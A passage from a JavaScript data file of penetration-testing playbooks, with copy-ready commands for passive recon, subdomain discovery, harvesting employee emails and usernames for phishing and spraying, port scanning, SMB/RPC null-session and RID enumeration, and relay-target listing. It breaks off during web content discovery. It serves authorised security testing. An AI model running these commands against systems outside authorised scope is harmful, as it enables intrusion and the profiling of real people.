// ============================================================================
// Darknode field diaries — offline hacking/defence playbook library.
//
// AUTHORIZED USE ONLY. These are standard penetration-testing and blue-team
// procedures (PTES / MITRE ATT&CK / OWASP style) for engagements, CTFs and labs
// on systems you own or are explicitly contracted to test. Each diary is a
// sequence of phases -> steps, every step carrying a real, copy-ready command.
//
// DATA ONLY. Generated/curated content; the Deck (deck-ui.js) renders it.
// 33 playbooks across 17 disciplines, 539 commands.
// ============================================================================

export const DIARY_CATS = ["Reconnaissance","OSINT","Enumeration","Web","Exploitation","Credential Access","Privilege Escalation","Persistence","Lateral Movement","Network","Wireless","Exfiltration","Active Directory","Reverse Engineering","Cloud","Containers","Blue Team"];

export const DIARIES = [
 {
  "id": "passive-reconnaissance",
  "title": "Passive Reconnaissance",
  "cat": "Reconnaissance",
  "goal": "Build a map of the target's internet footprint without sending a single packet to their production hosts.",
  "when": "At the very start of an engagement, before any active scanning, to scope assets and stay under the radar.",
  "risk": "low",
  "tools": [
   "whois",
   "amass",
   "subfinder",
   "curl",
   "theHarvester",
   "shodan",
   "waybackurls",
   "gau",
   "whatweb"
  ],
  "mitre": [
   "T1596 Search Open Technical Databases",
   "T1593 Search Open Websites/Domains",
   "T1590 Gather Victim Network Information",
   "T1594 Search Victim-Owned Websites"
  ],
  "phases": [
   {
    "name": "Ownership & netblocks",
    "steps": [
     {
      "do": "Pull registrar, dates and registrant contacts for the domain",
      "cmd": "whois <DOMAIN>",
      "note": "Note registrant org and name servers; expired-soon domains hint at sloppy ops."
     },
     {
      "do": "Resolve the IP then WHOIS it to find the owning org and netblock",
      "cmd": "whois <IP>",
      "note": "Look for the inetnum/CIDR and OrgName to confirm ownership before you touch anything."
     },
     {
      "do": "Enumerate ASNs and netblocks the organisation owns",
      "cmd": "amass intel -org '<DOMAIN>' -asn 0",
      "note": "Feed discovered ASNs back in with -asn <N> to expand CIDR ranges."
     }
    ]
   },
   {
    "name": "Certificate transparency",
    "steps": [
     {
      "do": "Query crt.sh for every certificate issued to the apex and wildcards",
      "cmd": "curl -s 'https://crt.sh/?q=%25.<DOMAIN>&output=json' | jq -r '.[].name_value' | sort -u",
      "note": "CT logs leak internal/dev hostnames that never appear in DNS brute lists."
     },
     {
      "do": "Harvest passive subdomains from open sources only",
      "cmd": "subfinder -d <DOMAIN> -silent -all -o subs_passive.txt",
      "note": "-all enables every passive source; no queries hit the target's own DNS."
     },
     {
      "do": "Mine a second CT-backed source and tag where each name came from",
      "cmd": "amass enum -passive -d <DOMAIN> -src -o subs_ct.txt",
      "note": "-src labels the data source per name so you can trust CT-derived hits."
     }
    ]
   },
   {
    "name": "Open databases & dorking",
    "steps": [
     {
      "do": "Pull Shodan's view of the organisation's exposed services",
      "cmd": "shodan search 'org:\"<DOMAIN>\"' --fields ip_str,port,product,org",
      "note": "Shodan already scanned them, so you see open ports without scanning yourself."
     },
     {
      "do": "Check a known IP's full Shodan host record",
      "cmd": "shodan host <IP>",
      "note": "Reveals banners, historical ports and detected vulns passively."
     },
     {
      "do": "Collect indexed pages, emails and employee names",
      "cmd": "theHarvester -d <DOMAIN> -b bing,duckduckgo,crtsh,certspotter -f harvest.html",
      "note": "Cross-reference emails here with later phishing/password-spray scope."
     }
    ]
   },
   {
    "name": "Historical content",
    "steps": [
     {
      "do": "Pull every URL the Wayback Machine ever archived for the domain",
      "cmd": "echo <DOMAIN> | waybackurls > wayback_urls.txt",
      "note": "Old URLs expose dead endpoints, params and backup files still live on servers."
     },
     {
      "do": "Filter archived URLs for interesting extensions and parameters",
      "cmd": "grep -iE '\\.(bak|old|zip|sql|config|env)|\\?' wayback_urls.txt | sort -u",
      "note": "Leftover .env/.sql/.bak artefacts are classic low-noise wins."
     },
     {
      "do": "Pull a second archive source with gau to catch URLs wayback missed",
      "cmd": "echo <DOMAIN> | gau --subs --o gau_urls.txt",
      "note": "--subs includes subdomain URLs; merge and sort -u with the wayback set."
     }
    ]
   },
   {
    "name": "Passive fingerprinting",
    "steps": [
     {
      "do": "Fingerprint the stack from a single banner-grab request",
      "cmd": "whatweb --no-errors -a 1 https://<DOMAIN>",
      "note": "-a 1 is stealthy (one request); records server, CMS, frameworks and versions."
     },
     {
      "do": "Inspect response headers directly for tech and security posture",
      "cmd": "curl -sI https://<DOMAIN>",
      "note": "Server, X-Powered-By and missing security headers all scope later testing."
     },
     {
      "do": "Read the robots.txt and sitemap for disclosed paths and tech hints",
      "cmd": "curl -s https://<DOMAIN>/robots.txt",
      "note": "Disallowed paths often point straight at admin, API and staging endpoints."
     }
    ]
   }
  ],
  "verify": "You have a deduplicated list of in-scope domains, subdomains, IP ranges, emails and the tech stack, all gathered without touching target hosts.",
  "cleanup": "Nothing to clean — no changes made to the target.",
  "safety": "Confirm every domain, ASN and netblock you enumerate is explicitly listed in the signed scope before moving to active phases."
 },
 {
  "id": "dns-subdomain-enumeration",
  "title": "DNS & Subdomain Enumeration",
  "cat": "Reconnaissance",
  "goal": "Discover and validate every reachable subdomain and virtual host belonging to the target domain.",
  "when": "During recon and before web testing, to expand the attack surface beyond the apex domain.",
  "risk": "low",
  "tools": [
   "subfinder",
   "amass",
   "assetfinder",
   "dnsx",
   "httpx",
   "ffuf",
   "gobuster",
   "dig",
   "dnsrecon"
  ],
  "mitre": [
   "T1590 Gather Victim Network Information",
   "T1595 Active Scanning",
   "T1596 Search Open Technical Databases",
   "T1593 Search Open Websites/Domains"
  ],
  "phases": [
   {
    "name": "Passive subdomain collection",
    "steps": [
     {
      "do": "Gather subdomains from passive sources with subfinder",
      "cmd": "subfinder -d <DOMAIN> -all -silent -o subs_passive.txt",
      "note": "Fast and quiet; queries third-party sources, not the target's DNS."
     },
     {
      "do": "Run a deeper passive sweep with amass and merge results",
      "cmd": "amass enum -passive -d <DOMAIN> -o subs_amass.txt",
      "note": "amass pulls from more sources; cat both files and sort -u into one master list."
     },
     {
      "do": "Add a third quick source and merge everything into one master list",
      "cmd": "assetfinder --subs-only <DOMAIN> | anew subs_all.txt",
      "note": "anew appends only new lines, so subs_all.txt stays a clean deduplicated set."
     }
    ]
   },
   {
    "name": "Active brute-force",
    "steps": [
     {
      "do": "Brute-force subdomains by fuzzing the DNS host label",
      "cmd": "ffuf -w <WORDLIST>:FUZZ -u http://FUZZ.<DOMAIN> -mc 200,301,302,403 -o ffuf_dns.json",
      "note": "Use a DNS wordlist like subdomains-top1million; -mc filters for live responses."
     },
     {
      "do": "Alternatively brute-force the DNS namespace with gobuster dns mode",
      "cmd": "gobuster dns -d <DOMAIN> -w <WORDLIST> -t 50 -o gobuster_dns.txt",
      "note": "gobuster resolves names directly; good when HTTP probing is not yet needed."
     },
     {
      "do": "Generate permutations of known names and resolve them with dnsx",
      "cmd": "dnsx -d <DOMAIN> -w <WORDLIST> -silent -o brute_resolved.txt",
      "note": "dnsx brute-resolves fast with its own resolvers and drops wildcard noise."
     }
    ]
   },
   {
    "name": "Zone transfer",
    "steps": [
     {
      "do": "Enumerate the authoritative name servers for the domain",
      "cmd": "dig +short NS <DOMAIN>",
      "note": "Every listed NS is a candidate to attempt a zone transfer against."
     },
     {
      "do": "Attempt a full zone transfer against each name server",
      "cmd": "dig axfr <DOMAIN> @<IP>",
      "note": "A successful AXFR dumps the entire zone in one shot; still rare but a jackpot."
     },
     {
      "do": "Run a scripted DNS audit including AXFR and common records",
      "cmd": "dnsrecon -d <DOMAIN> -a",
      "note": "-a adds an AXFR attempt against all NS plus standard record enumeration."
     }
    ]
   },
   {
    "name": "Resolve & probe",
    "steps": [
     {
      "do": "Resolve the full candidate list to filter out dead names",
      "cmd": "cat subs_*.txt | sort -u | dnsx -silent -a -resp -o resolved.txt",
      "note": "Only resolvable names matter; this strips wildcard and dead entries."
     },
     {
      "do": "Probe resolved hosts for live HTTP/S services and capture metadata",
      "cmd": "cat resolved.txt | httpx -silent -title -status-code -tech-detect -o live_web.txt",
      "note": "-tech-detect fingerprints each host so you can prioritise juicy targets."
     },
     {
      "do": "Flag hosts that point at third-party services for subdomain-takeover review",
      "cmd": "cat resolved.txt | httpx -silent -cname -o cnames.txt",
      "note": "Dangling CNAMEs to unclaimed cloud buckets or apps are takeover candidates."
     }
    ]
   },
   {
    "name": "Virtual-host fuzzing",
    "steps": [
     {
      "do": "Fuzz the Host header against a known IP to find unlisted vhosts",
      "cmd": "ffuf -w <WORDLIST>:FUZZ -u http://<IP>/ -H 'Host: FUZZ.<DOMAIN>' -fs 0 -o vhosts.json",
      "note": "Calibrate -fs/-fc to the default-vhost response size so only different pages show."
     },
     {
      "do": "Confirm an interesting vhost resolves to a distinct application",
      "cmd": "curl -s -H 'Host: <USER>.<DOMAIN>' http://<IP>/ -I",
      "note": "A different Content-Length or title versus the default vhost confirms a real app."
     },
     {
      "do": "Probe every discovered vhost and name for live services at once",
      "cmd": "cat subs_all.txt | httpx -silent -sc -title -o vhost_live.txt",
      "note": "Consolidate confirmed live apps here before handing off to web testing."
     }
    ]
   }
  ],
  "verify": "You have a deduplicated list of resolvable subdomains and virtual hosts, each tagged with its status code, title and detected technology.",
  "cleanup": "Nothing to clean — enumeration is read-only against DNS and HTTP; remove local output files per data-handling rules.",
  "safety": "Keep brute-force and probing within the authorized domains and rate-limit DNS queries to avoid disrupting the target's resolvers."
 },
 {
  "id": "osint-email-people-harvesting",
  "title": "OSINT & Email/People Harvesting",
  "cat": "OSINT",
  "goal": "Assemble a roster of employees, email addresses, usernames and leaked secrets from public sources to support social-engineering and credential scoping.",
  "when": "During recon, in parallel with technical enumeration, to build the human attack surface for authorized phishing and spraying.",
  "risk": "low",
  "tools": [
   "theHarvester",
   "sherlock",
   "exiftool",
   "trufflehog",
   "gitleaks",
   "curl"
  ],
  "mitre": [
   "T1589 Gather Victim Identity Information",
   "T1591 Gather Victim Org Information",
   "T1593 Search Open Websites/Domains",
   "T1596 Search Open Technical Databases"
  ],
  "phases": [
   {
    "name": "Email & employee harvesting",
    "steps": [
     {
      "do": "Harvest emails, hosts and names from multiple public engines",
      "cmd": "theHarvester -d <DOMAIN> -b bing,duckduckgo,crtsh,hackertarget,certspotter -f osint.html",
      "note": "Export to HTML/XML so the roster feeds directly into reporting."
     },
     {
      "do": "Derive the corporate email naming pattern from any confirmed address",
      "cmd": "curl -s 'https://api.hunter.io/v2/domain-search?domain=<DOMAIN>&api_key=<USER>'",
      "note": "The returned pattern (e.g. first.last) lets you predict emails for known names."
     },
     {
      "do": "Extract just the unique email addresses from the harvest for the roster",
      "cmd": "grep -oiE '[a-z0-9._%+-]+@<DOMAIN>' osint.html | sort -u > emails.txt",
      "note": "This clean list feeds authorized phishing and spray scoping."
     }
    ]
   },
   {
    "name": "Breach & credential exposure",
    "steps": [
     {
      "do": "Check whether an in-scope address appears in known public breaches",
      "cmd": "curl -s 'https://haveibeenpwned.com/api/v3/breachedaccount/<USER>%40<DOMAIN>' -H 'hibp-api-key: <USER>'",
      "note": "Defensive framing: this evidences exposure risk, not a source of live passwords."
     },
     {
      "do": "Record which breaches hit the org to advise credential-hygiene remediation",
      "cmd": "curl -s 'https://haveibeenpwned.com/api/v3/breaches?domain=<DOMAIN>'",
      "note": "Report counts and breach names; never attempt to source or reuse actual leaked passwords."
     },
     {
      "do": "Check whether a chosen password hash is publicly known, privacy-preserving",
      "cmd": "curl -s 'https://api.pwnedpasswords.com/range/ABCDE'",
      "note": "The k-anonymity range API confirms exposure of a hash prefix without sending the full password."
     }
    ]
   },
   {
    "name": "Username enumeration",
    "steps": [
     {
      "do": "Hunt a suspected username across hundreds of platforms",
      "cmd": "sherlock <USER>",
      "note": "Found profiles reveal reused handles, personal interests and pivot points."
     },
     {
      "do": "Run several candidate usernames derived from the email pattern",
      "cmd": "sherlock <USER> flast firstl --timeout 10 --print-found",
      "note": "--print-found trims noise; correlate hits back to named employees."
     },
     {
      "do": "Save per-site results to a folder for evidence and manual review",
      "cmd": "sherlock <USER> --folderoutput osint/usernames --no-color",
      "note": "Keeps a durable record of each confirmed profile URL for the report."
     }
    ]
   },
   {
    "name": "Document metadata",
    "steps": [
     {
      "do": "Mirror public documents from the target site for metadata review",
      "cmd": "curl -s 'https://<DOMAIN>/sitemap.xml' | grep -oE 'https?://[^<]+\\.(pdf|docx|xlsx|pptx)' > docs.txt",
      "note": "Build a list of public office/PDF files before extracting their metadata."
     },
     {
      "do": "Extract author, software and path metadata from a downloaded file",
      "cmd": "exiftool -Author -Creator -Producer -Software <USER>.pdf",
      "note": "Author fields leak real usernames and internal software versions."
     },
     {
      "do": "Batch-extract metadata from a whole folder of public documents",
      "cmd": "exiftool -r -csv -Author -Creator -Company osint/docs/ > metadata.csv",
      "note": "A CSV of authors and internal paths quickly reveals naming conventions and share names."
     }
    ]
   },
   {
    "name": "Source-code secret leaks",
    "steps": [
     {
      "do": "Scan the organisation's public repositories for committed secrets",
      "cmd": "trufflehog github --org=<DOMAIN> --only-verified",
      "note": "--only-verified filters to secrets TruffleHog could actually validate as live."
     },
     {
      "do": "Scan a specific cloned public repo for leaked keys across its history",
      "cmd": "gitleaks detect --source <USER> --report-path gitleaks.json",
      "note": "gitleaks walks full git history, catching secrets deleted from the current tree."
     },
     {
      "do": "Search public code across GitHub for the domain near secret keywords",
      "cmd": "curl -s 'https://api.github.com/search/code?q=<DOMAIN>+password+in:file' -H 'Authorization: token <USER>'",
      "note": "Manually triage hits; report any live secret to the client and never reuse it."
     }
    ]
   }
  ],
  "verify": "You have a consolidated roster of employees, validated email addresses, reused usernames, exposed documents and any verified leaked secrets.",
  "cleanup": "Securely delete downloaded documents and cloned repos and purge any discovered secrets from local notes per data-handling rules.",
  "safety": "Collect only from public sources on in-scope identities, treat breach data as evidence of risk rather than usable credentials, and handle all findings per the engagement's data-handling and privacy rules."
 },
 {
  "id": "active-host-discovery-port-scanning",
  "title": "Active Host Discovery & Port Scanning",
  "cat": "Enumeration",
  "goal": "Identify live hosts in scope and map their open TCP and UDP ports efficiently.",
  "when": "Immediately after passive recon, once you have in-scope ranges and written authorization to send traffic.",
  "risk": "medium",
  "tools": [
   "nmap",
   "masscan",
   "fping",
   "arp-scan",
   "rustscan"
  ],
  "mitre": [
   "T1595 Active Scanning",
   "T1046 Network Service Discovery",
   "T1018 Remote System Discovery"
  ],
  "phases": [
   {
    "name": "Host discovery",
    "steps": [
     {
      "do": "Ping-sweep the range to list responsive hosts without port scanning",
      "cmd": "nmap -sn -oA scans/sweep <TARGET>/24",
      "note": "-sn skips port scan; good first pass but misses hosts that block ICMP."
     },
     {
      "do": "Sweep quickly with fping when ICMP is allowed",
      "cmd": "fping -a -g <TARGET>/24 2>/dev/null",
      "note": "-a prints only alive hosts; pipe to a file to seed the next scan."
     },
     {
      "do": "Discover hosts on the local L2 segment via ARP (unmissable on LAN)",
      "cmd": "sudo arp-scan --interface <INTERFACE> --localnet",
      "note": "ARP sees hosts that drop ICMP; only works on the same broadcast domain."
     }
    ]
   },
   {
    "name": "Fast full-port sweep",
    "steps": [
     {
      "do": "Blast all 65535 TCP ports fast with masscan to find what is open",
      "cmd": "sudo masscan <TARGET>/24 -p1-65535 --rate 10000 -oL scans/masscan.txt",
      "note": "Tune --rate down on fragile/production networks to avoid knocking services over."
     },
     {
      "do": "Alternatively use rustscan to find open ports then hand off to nmap",
      "cmd": "rustscan -a <TARGET> --ulimit 5000 -- -sV -oA scans/rustscan",
      "note": "rustscan finds open ports in seconds, then pipes them straight into nmap after the --."
     },
     {
      "do": "Convert masscan output into a clean comma-separated port list for nmap",
      "cmd": "grep -oE 'port [0-9]+' scans/masscan.txt | awk '{print $2}' | sort -un | paste -sd, -",
      "note": "Hand this exact list to the targeted nmap scan so you probe only open ports."
     }
    ]
   },
   {
    "name": "Targeted TCP scan",
    "steps": [
     {
      "do": "Run a thorough connect/SYN scan across all TCP ports on a single host",
      "cmd": "sudo nmap -p- --min-rate 5000 -T4 -oA scans/all <TARGET>",
      "note": "Save the open-port list; feed exactly those ports to version/script scans next."
     },
     {
      "do": "Deep-scan only the discovered open ports with service and script detection",
      "cmd": "sudo nmap -sV -sC -p22,80,443,445 -oA scans/targeted <TARGET>",
      "note": "Replace the port list with the open ports from the -p- scan output."
     },
     {
      "do": "Add OS detection and traceroute on the live host for context",
      "cmd": "sudo nmap -O --osscan-guess --traceroute -oA scans/os <TARGET>",
      "note": "OS guess plus hop count helps you tell VMs, appliances and segments apart."
     }
    ]
   },
   {
    "name": "UDP coverage",
    "steps": [
     {
      "do": "Scan the most common UDP ports (full UDP is slow and rate-limited)",
      "cmd": "sudo nmap -sU --top-ports 100 -oA scans/udp <TARGET>",
      "note": "Watch for 53, 123, 161, 500; UDP replies are unreliable so re-run to confirm."
     },
     {
      "do": "Version-probe the interesting UDP services found",
      "cmd": "sudo nmap -sU -sV -p53,161,500 -oA scans/udp-sv <TARGET>",
      "note": "SNMP (161) with a weak community string is a frequent quick win."
     },
     {
      "do": "Re-scan flaky open|filtered UDP ports to confirm they are really open",
      "cmd": "sudo nmap -sU -p161,500 --max-retries 3 --reason -oA scans/udp-confirm <TARGET>",
      "note": "--reason shows why a port is marked that state; UDP needs retries to be trustworthy."
     }
    ]
   },
   {
    "name": "Output management",
    "steps": [
     {
      "do": "Keep all three nmap output formats under one scans directory",
      "cmd": "mkdir -p scans && nmap -p- -oA scans/host-<TARGET> <TARGET>",
      "note": "-oA writes .nmap, .gnmap and .xml; the XML feeds reporting tools later."
     },
     {
      "do": "Extract just the open ports across all gnmap files for quick reference",
      "cmd": "grep -hoE '[0-9]+/open' scans/*.gnmap | cut -d/ -f1 | sort -un",
      "note": "A clean port inventory speeds up the service-enumeration playbook."
     },
     {
      "do": "Build a tidy HTML report from the nmap XML for the engagement record",
      "cmd": "xsltproc scans/all.xml -o scans/all.html",
      "note": "The styled HTML is easy to drop into findings and share with the team."
     }
    ]
   }
  ],
  "verify": "You have an authoritative list of live hosts with their open TCP and UDP ports saved in all three nmap output formats.",
  "cleanup": "Nothing to clean — scanning sends no payloads; remove local scans/ output when the engagement closes per data-handling rules.",
  "safety": "Only scan IP ranges explicitly in scope, throttle rates on production networks, and respect any no-scan windows in the rules of engagement."
 },
 {
  "id": "service-enumeration-nse",
  "title": "Service Enumeration & NSE",
  "cat": "Enumeration",
  "goal": "Fingerprint each open service precisely and pull low-hanging configuration and version intel with nmap NSE and native clients.",
  "when": "After port scanning, to turn a list of open ports into actionable service-and-version detail for exploitation planning.",
  "risk": "medium",
  "tools": [
   "nmap",
   "nmap-nse",
   "snmpwalk",
   "smbclient",
   "ftp",
   "nc",
   "whatweb",
   "curl"
  ],
  "mitre": [
   "T1046 Network Service Discovery",
   "T1595 Active Scanning",
   "T1082 System Information Discovery",
   "T1083 File and Directory Discovery"
  ],
  "phases": [
   {
    "name": "Baseline version & default scripts",
    "steps": [
     {
      "do": "Run version detection plus the default safe script set on open ports",
      "cmd": "sudo nmap -sV -sC -p<PORTS> -oA scans/enum <TARGET>",
      "note": "-sC runs the 'default' NSE category; read every script line, that is where the intel is."
     },
     {
      "do": "Grab raw banners manually where version detection is ambiguous",
      "cmd": "nc -nv <TARGET> <PORT>",
      "note": "Send a newline or an HTTP request manually to coax a version banner out."
     },
     {
      "do": "Run an all-ports aggressive scan to catch services on odd ports",
      "cmd": "sudo nmap -sV -A -p- --version-all -oA scans/aggressive <TARGET>",
      "note": "--version-all tries every probe intensity; slower but catches hidden daemons."
     }
    ]
   },
   {
    "name": "HTTP/S",
    "steps": [
     {
      "do": "Enumerate web server headers, methods, titles and common issues",
      "cmd": "sudo nmap -p80,443 --script http-headers,http-methods,http-title,http-enum -oA scans/http <TARGET>",
      "note": "http-enum brute-forces common paths; watch for admin panels and dev endpoints."
     },
     {
      "do": "Fingerprint the web stack and any CMS",
      "cmd": "whatweb -a 3 http://<TARGET>",
      "note": "-a 3 is aggressive; pair with the version data to pick exploits."
     },
     {
      "do": "List supported HTTP methods and the server banner by hand",
      "cmd": "curl -s -X OPTIONS http://<TARGET>/ -i",
      "note": "PUT, DELETE or TRACE in the Allow header are worth chasing for upload or XST issues."
     }
    ]
   },
   {
    "name": "SMB",
    "steps": [
     {
      "do": "Enumerate SMB protocols, shares, sessions and OS",
      "cmd": "sudo nmap -p445 --script 'smb-os-discovery,smb-enum-shares,smb-enum-sessions,smb-protocols' -oA scans/smb <TARGET>",
      "note": "smb-protocols tells you if SMBv1 is still enabled (EternalBlue territory)."
     },
     {
      "do": "Check for the classic SMB RCE vulnerabilities safely",
      "cmd": "sudo nmap -p445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 -oA scans/smb-vuln <TARGET>",
      "note": "These checks are non-intrusive detection scripts, not exploits."
     },
     {
      "do": "List shares with a null session using a native client",
      "cmd": "smbclient -L //<TARGET>/ -N",
      "note": "-N tries a null/anonymous session; readable shares are instant data wins."
     }
    ]
   },
   {
    "name": "FTP, SSH & SMTP",
    "steps": [
     {
      "do": "Test FTP for anonymous access and known backdoors",
      "cmd": "sudo nmap -p21 --script ftp-anon,ftp-syst,ftp-vsftpd-backdoor -oA scans/ftp <TARGET>",
      "note": "ftp-anon reporting 'Anonymous FTP login allowed' means browse it with the ftp client."
     },
     {
      "do": "Log in anonymously to FTP and list the root",
      "cmd": "ftp -p <TARGET>",
      "note": "Use anonymous as the username and any email as the password when prompted."
     },
     {
      "do": "Enumerate SSH algorithms/auth methods and valid SMTP users",
      "cmd": "sudo nmap -p22,25 --script ssh2-enum-algos,ssh-auth-methods,smtp-enum-users,smtp-commands -oA scans/ssh-smtp <TARGET>",
      "note": "smtp-enum-users via VRFY/EXPN gives a free username list for spraying."
     }
    ]
   },
   {
    "name": "SNMP & LDAP",
    "steps": [
     {
      "do": "Brute the SNMP community string and pull the OID tree if it is weak",
      "cmd": "snmpwalk -v2c -c public <TARGET>",
      "note": "'public' or 'private' still work shockingly often; the walk dumps processes, users and routes."
     },
     {
      "do": "Confirm SNMP exposure and enumerate LDAP naming contexts with NSE",
      "cmd": "sudo nmap -sU -p161 --script snmp-info,snmp-processes -p389 --script ldap-rootdse,ldap-search -oA scans/snmp-ldap <TARGET>",
      "note": "ldap-rootdse reveals the domain naming context, a gift for AD attacks later."
     },
     {
      "do": "Dump installed software and network interfaces if SNMP is readable",
      "cmd": "snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.6.3.1.2",
      "note": "This OID lists installed packages; match versions against known CVEs."
     }
    ]
   }
  ],
  "verify": "Every open port has a confirmed service, version and a list of enumerated details or candidate vulnerabilities recorded in scans/.",
  "cleanup": "Nothing to clean — enumeration reads service data only; remove local scan output per data-handling rules at engagement close.",
  "safety": "Use only detection/default NSE categories unless exploitation is authorized, and avoid intrusive scripts on fragile production services."
 },
 {
  "id": "smb-netbios-rpc-enumeration",
  "title": "SMB, NetBIOS & RPC Enumeration",
  "cat": "Enumeration",
  "goal": "Extract shares, users, groups and password policy from Windows/Samba hosts using null sessions and RPC where allowed.",
  "when": "After finding TCP 139/445 open, to pull domain and share intel that feeds credential and lateral-movement attacks.",
  "risk": "medium",
  "tools": [
   "enum4linux-ng",
   "crackmapexec",
   "rpcclient",
   "smbclient",
   "nmap",
   "smbmap",
   "nmblookup"
  ],
  "mitre": [
   "T1135 Network Share Discovery",
   "T1087 Account Discovery",
   "T1069 Permission Groups Discovery",
   "T1201 Password Policy Discovery",
   "T1046 Network Service Discovery"
  ],
  "phases": [
   {
    "name": "Null-session baseline",
    "steps": [
     {
      "do": "Run a full automated SMB/RPC enumeration pass",
      "cmd": "enum4linux-ng -A <TARGET>",
      "note": "-A runs all checks: OS, shares, users, groups, policy; your first and best overview."
     },
     {
      "do": "Fingerprint SMB dialects, signing and OS with crackmapexec",
      "cmd": "crackmapexec smb <TARGET>",
      "note": "Signing:False is a relay target; note the hostname and domain in the banner line."
     },
     {
      "do": "Enumerate NetBIOS names to learn the host and workgroup",
      "cmd": "nmblookup -A <TARGET>",
      "note": "The <20> suffix marks a file-server service; <00> entries give host and domain names."
     }
    ]
   },
   {
    "name": "Share enumeration",
    "steps": [
     {
      "do": "List shares and your access level over a null session",
      "cmd": "smbmap -H <TARGET> -u '' -p ''",
      "note": "READ/WRITE flags per share tell you instantly where to drop or pull files."
     },
     {
      "do": "List shares with a native client as an anonymous user",
      "cmd": "smbclient -L //<TARGET>/ -N",
      "note": "Cross-check with smbmap; non-default shares often hold backups and scripts."
     },
     {
      "do": "Connect to a readable share and recurse for interesting files",
      "cmd": "smbclient //<TARGET>/<USER> -N -c 'recurse ON; ls'",
      "note": "Hunt for config, .xml, .vbs and password-looking files before pulling them."
     }
    ]
   },
   {
    "name": "User & group enumeration via RPC",
    "steps": [
     {
      "do": "Open an anonymous RPC session to the host",
      "cmd": "rpcclient -U '' -N <TARGET>",
      "note": "If it connects, you can run enumeration verbs interactively below."
     },
     {
      "do": "Enumerate domain users and query a specific account",
      "cmd": "rpcclient -U '' -N <TARGET> -c 'enumdomusers;queryuser 0x1f4'",
      "note": "queryuser on a RID shows last logon and bad-password count for spraying planning."
     },
     {
      "do": "List groups and the domain SID",
      "cmd": "rpcclient -U '' -N <TARGET> -c 'enumdomgroups;lsaquery'",
      "note": "The domain SID is the base for RID cycling in the next phase."
     }
    ]
   },
   {
    "name": "RID cycling & password policy",
    "steps": [
     {
      "do": "Cycle RIDs to resolve account names when enumdomusers is blocked",
      "cmd": "crackmapexec smb <TARGET> -u '' -p '' --rid-brute 4000",
      "note": "Works even when direct user enumeration is denied; builds a clean user list."
     },
     {
      "do": "Pull the password policy to tune lockout-safe spraying",
      "cmd": "crackmapexec smb <TARGET> -u '' -p '' --pass-pol",
      "note": "Lockout threshold and observation window decide how many sprays are safe."
     },
     {
      "do": "Enumerate the server's local users over RPC to seed the user list",
      "cmd": "rpcclient -U '' -N <TARGET> -c 'enumdomusers'",
      "note": "Combine these names with the RID-brute output into one deduplicated user file."
     }
    ]
   },
   {
    "name": "SMB vulnerability checks",
    "steps": [
     {
      "do": "Check for the MS17-010 EternalBlue condition non-intrusively",
      "cmd": "sudo nmap -p445 --script smb-vuln-ms17-010 -oA scans/smb-ms17 <TARGET>",
      "note": "Detection only; flag as a finding before any exploitation is authorized."
     },
     {
      "do": "Verify whether SMB signing is required (relay exposure)",
      "cmd": "crackmapexec smb <TARGET> --gen-relay-list relay_targets.txt",
      "note": "Hosts written to the file have signing disabled and are NTLM-relay candidates."
     },
     {
      "do": "Run the full SMB vuln NSE category for a broader safety sweep",
      "cmd": "sudo nmap -p445 --script 'smb-vuln-*' --script-args unsafe=0 -oA scans/smb-vuln-all <TARGET>",
      "note": "unsafe=0 keeps checks non-destructive; review each reported CVE as a finding."
     }
    ]
   }
  ],
  "verify": "You have share access levels, a resolved user and group list, the domain SID, and the password policy recorded for the target.",
  "cleanup": "Delete any files you copied from shares and remove local scan/relay-list output; make no writes to target shares.",
  "safety": "Stay within authorized hosts, avoid write operations to shares unless explicitly permitted, and respect lockout thresholds when planning any spray."
 },
 {
  "id": "web-content-discovery-fingerprinting",
  "title": "Web Content Discovery & Fingerprinting",
  "cat": "Web",
  "goal": "Map a web target's technology stack, hidden content, and attack surface before active testing.",
  "when": "At the start of any web application assessment once a live host and scope are confirmed.",
  "risk": "low",
  "tools": [
   "ffuf",
   "feroxbuster",
   "gobuster",
   "whatweb",
   "httpx",
   "nuclei",
   "arjun",
   "gau"
  ],
  "mitre": [
   "T1595 Active Scanning",
   "T1590 Gather Victim Network Information",
   "T1592 Gather Victim Host Information",
   "T1583 Acquire Infrastructure"
  ],
  "phases": [
   {
    "name": "Probe & fingerprint",
    "steps": [
     {
      "do": "Probe liveness, titles, status codes, and tech with httpx",
      "cmd": "httpx -u <URL> -title -status-code -tech-detect -server -follow-redirects -o httpx.txt",
      "note": "Feed a list with -l hosts.txt to probe many at once."
     },
     {
      "do": "Deep technology fingerprint with whatweb at aggression 3",
      "cmd": "whatweb -a 3 <URL> --log-verbose whatweb.txt",
      "note": "Aggression 3 sends extra requests to confirm plugins; stay in scope."
     },
     {
      "do": "Grab headers and inspect for framework and security headers",
      "cmd": "curl -sSIL <URL> | tee headers.txt",
      "note": "Look at Server, X-Powered-By, Set-Cookie flags, and CSP."
     },
     {
      "do": "Run nuclei technology templates for version-level detail",
      "cmd": "nuclei -u <URL> -t http/technologies/ -severity info -o nuclei-tech.txt"
     }
    ]
   },
   {
    "name": "Passive endpoint harvesting",
    "steps": [
     {
      "do": "Pull historical URLs from web archives and common crawl with gau",
      "cmd": "gau --threads 10 <DOMAIN> | sort -u | tee gau-urls.txt",
      "note": "Add --subs to include subdomains in the archive query."
     },
     {
      "do": "Fetch robots.txt and sitemap to seed the wordlist",
      "cmd": "curl -sSL <URL>/robots.txt; curl -sSL <URL>/sitemap.xml",
      "note": "Disallowed paths are often the most interesting."
     },
     {
      "do": "Extract endpoints and paths referenced inside JavaScript bundles",
      "cmd": "gau <DOMAIN> | grep -Ei '\\.js($|\\?)' | httpx -mc 200 -silent | while read j; do curl -sSL \"$j\" | grep -Eo '\"/[a-zA-Z0-9_/.-]+\"'; done | sort -u | tee js-endpoints.txt"
     }
    ]
   },
   {
    "name": "Directory & file brute force",
    "steps": [
     {
      "do": "Fast fuzz directories and files with ffuf, filtering noise",
      "cmd": "ffuf -u <URL>/FUZZ -w <WORDLIST> -mc 200,204,301,302,307,401,403 -ac -recursion -recursion-depth 2 -o ffuf-dirs.json",
      "note": "-ac auto-calibrates to drop wildcard/soft-404 responses."
     },
     {
      "do": "Recursive content discovery with feroxbuster and extension expansion",
      "cmd": "feroxbuster -u <URL> -w <WORDLIST> -x php,txt,bak,zip,old,json -t 40 -r -o ferox.txt",
      "note": "-r follows redirects; -x probes common backup and config extensions."
     },
     {
      "do": "Enumerate with gobuster as a cross-check and for status breakdown",
